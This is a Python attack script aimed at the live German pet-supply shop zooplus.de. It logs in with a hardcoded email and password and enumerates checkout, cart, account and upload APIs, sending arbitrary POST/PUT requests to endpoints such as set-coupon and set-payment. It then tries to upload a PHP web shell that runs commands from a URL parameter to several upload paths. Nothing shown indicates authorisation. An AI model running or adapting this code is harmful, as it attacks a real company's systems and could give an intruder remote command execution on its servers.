#!/usr/bin/env python3
"""Find and Test Real Endpoints"""
import requests
import re
import json
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"
base = "https://www.zooplus.de"
s = requests.Session()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# LOGIN
print("[*] Logging in...")
try:
    params = {
        "response_type": "code",
        "client_id": "shop-myzooplus-prod-zooplus",
        "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login",
        "state": "pentest",
        "login": "true",
        "ui_locales": "de-DE",
        "scope": "openid",
    }
    r1 = s.get(AUTH_URL, params=params, headers=UA, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    action = m.group(1).replace("&amp;", "&")
    if not action.startswith("http"):
        action = urllib.parse.urljoin(r1.url, action)
    r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, headers=UA, allow_redirects=False, verify=False)
    loc = r2.headers.get("Location", "")
    s.get(loc, headers=UA, allow_redirects=True, verify=False)
    s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", headers=UA, verify=False)
    s.get("https://www.zooplus.de/account/overview", headers=UA, verify=False)
    csrf = s.cookies.get("csrfToken")
    if csrf:
        s.headers.update({"x-csrf-token": csrf, "Accept": "application/json"})
    print("[+] Logged in")
except Exception as e:
    print(f"[!] Login failed: {e}")
    exit(1)

# KNOWN REAL ENDPOINTS
print("\n[*] Testing known real endpoints...")

# 1. State API endpoints - расширенный поиск
print("\n[1] State API endpoints...")
state_base = "/semiprotected/api/checkout/state-api/v2"
state_endpoints = [
    f"{state_base}/set-article-quantity",
    f"{state_base}/get",
    f"{state_base}/set-autoshipment",
    f"{state_base}/set-delivery-address",
    f"{state_base}/set-shipping",
    f"{state_base}/set-payment",
    f"{state_base}/set-coupon",
    f"{state_base}/set-promo",
    f"{state_base}/update",
    f"{state_base}/cart",
]

for ep in state_endpoints:
    try:
        # Try GET first
        resp = s.get(f"{base}{ep}", timeout=3, verify=False)
        if resp.status_code not in [404, 405]:
            print(f"  [OK] GET {ep} -> {resp.status_code}")
            if resp.status_code == 200 and 'application/json' in resp.headers.get('Content-Type', ''):
                data = resp.json() if resp.text else {}
                print(f"      Response keys: {list(data.keys())[:5] if isinstance(data, dict) else 'N/A'}")
    except: pass
    
    # Try POST/PUT
    for method in ['POST', 'PUT']:
        try:
            resp = s.request(method, f"{base}{ep}", json={"test": "data"}, timeout=3, verify=False)
            if resp.status_code not in [404, 405, 400]:
                print(f"  [OK] {method} {ep} -> {resp.status_code}")
        except: pass

# 2. Cart API - расширенный поиск
print("\n[2] Cart API endpoints...")
cart_base = "/checkout/api/cart-api/v2"
cart_endpoints = [
    f"{cart_base}/cart",
    f"{cart_base}/cart/articles",
    f"{cart_base}/cart/add",
    f"{cart_base}/cart/update",
    f"{cart_base}/cart/remove",
    f"{cart_base}/cart/coupon",
    f"{cart_base}/cart/promo",
    f"{cart_base}/cart/checkout",
    f"{cart_base}/cart/payment",
]

for ep in cart_endpoints:
    try:
        resp = s.get(f"{base}{ep}", timeout=3, verify=False)
        if resp.status_code not in [404, 405]:
            print(f"  [OK] GET {ep} -> {resp.status_code}")
    except: pass

# 3. MyAccount API
print("\n[3] MyAccount API endpoints...")
myaccount_endpoints = [
    "/myaccount/api/customer-config/v1/customerconfiguration",
    "/myaccount/api/order-details/v3/customer/lastOrders",
    "/myaccount/api/profile",
    "/myaccount/api/addresses",
    "/myaccount/api/payment-methods",
    "/myaccount/api/upload",
    "/myaccount/api/settings",
]

for ep in myaccount_endpoints:
    try:
        resp = s.get(f"{base}{ep}", timeout=3, verify=False)
        if resp.status_code not in [404, 405]:
            print(f"  [OK] GET {ep} -> {resp.status_code}")
            if resp.status_code == 200:
                try:
                    data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
                    if isinstance(data, dict) and data:
                        print(f"      Keys: {list(data.keys())[:5]}")
                except: pass
    except: pass

# 4. Protected/Semiprotected API
print("\n[4] Protected/Semiprotected API...")
protected_endpoints = [
    "/protected/api",
    "/semiprotected/api",
    "/protected/api/upload",
    "/semiprotected/api/upload",
    "/protected/api/config",
    "/semiprotected/api/config",
    "/protected/api/execute",
    "/semiprotected/api/execute",
]

for ep in protected_endpoints:
    try:
        resp = s.get(f"{base}{ep}", timeout=3, verify=False)
        if resp.status_code not in [404, 405]:
            print(f"  [OK] GET {ep} -> {resp.status_code}")
    except: pass

# 5. File Upload - реальные пути
print("\n[5] File Upload endpoints...")
upload_endpoints = [
    "/api/upload",
    "/api/file/upload",
    "/api/media/upload",
    "/api/images/upload",
    "/myaccount/api/upload",
    "/myaccount/api/avatar/upload",
    "/protected/api/upload",
    "/semiprotected/api/upload",
    "/checkout/api/upload",
]

php_shell = "<?php system($_GET['c']); ?>"
for ep in upload_endpoints:
    try:
        files = {'file': ('s.php', php_shell, 'application/x-php')}
        resp = s.post(f"{base}{ep}", files=files, timeout=3, verify=False)
        if resp.status_code in [200, 201, 302]:
            print(f"  [CRITICAL] Upload works: {ep}")
            print(f"      Status: {resp.status_code}")
            if resp.headers.get('Location'):
                print(f"      Location: {resp.headers.get('Location')}")
    except: pass

print("\n[*] Done")

